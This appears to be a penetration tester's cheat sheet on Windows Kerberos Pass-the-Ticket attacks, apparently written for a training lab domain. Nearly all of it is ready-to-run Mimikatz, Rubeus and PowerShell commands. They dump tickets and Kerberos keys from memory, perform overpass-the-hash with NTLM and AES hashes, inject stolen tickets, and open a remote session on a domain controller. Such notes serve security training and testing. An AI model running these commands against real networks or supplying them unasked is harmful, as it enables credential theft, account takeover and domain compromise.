# Pass the Ticket Windows

***

https://github.com/GhostPack/Rubeus

## Kerberos

* The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
* The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.

### Harvesting Kerbertos Tickets

#### Mimikatz

```cmd-session
privilege::debug
sekurlsa::tickets /export
```

&#x20;`[randomvalue]-username@service-domain.local.kirbi`

#### Export Tickets - Rubeus

```cmd
Rubeus.exe dump /nowrap
```

### Pass the Key or OverPass the Hash

#### Extract Kerberos Keys - Mimikatz

```cmd
privilege::debug
sekurlsa::ekeys
```

#### Mimikatz

```cmd-session
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

#### Rubeus

```cmd-session
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

## Pass the Ticket

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### Convert .kirbi to Base64 Format

```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

### Mimikatz

```cmd-session
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

## Pass The Ticket with PS Remoting

```cmd-session
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

```cmd-session
c:\tools>powershell
```

```cmd-session
PS C:\tools> Enter-PSSession -ComputerName DC01
```

### Rubeus

```cmd-session
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

```cmd-session
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

```powershell
powershell
Enter-PSSession -ComputerName DC01
```
